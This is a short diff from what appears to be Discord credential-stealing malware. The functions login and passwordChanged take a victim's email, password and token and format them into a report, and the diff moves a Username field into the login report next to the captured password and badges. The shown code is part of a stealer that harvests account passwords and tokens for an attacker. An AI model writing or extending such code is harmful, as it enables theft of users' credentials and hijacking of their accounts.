@@ -754,6 +754,11 @@ const login = async (email, password, token) => {
           inline: false
         },
         {
+          name: '<:patriot_token:1032868283759730728> Username',
+          value: `\`${json.username}\``,
+          inline: true,
+        },
+        {
           name: "<:prt_sxtaar:1032868516686200863> Badges",
           value: `\`${badges}\``,
           inline: true
@@ -841,11 +846,6 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           {
             name: '<:lxckk:1032868282153316353> New password',
             value: `\`${newpassword}\``,
-            inline: true,
-          },
-          {
-            name: '<:patriot_token:1032868283759730728> Username',
-            value: `\`${json.username}\``,
             inline: true,
           },
           {
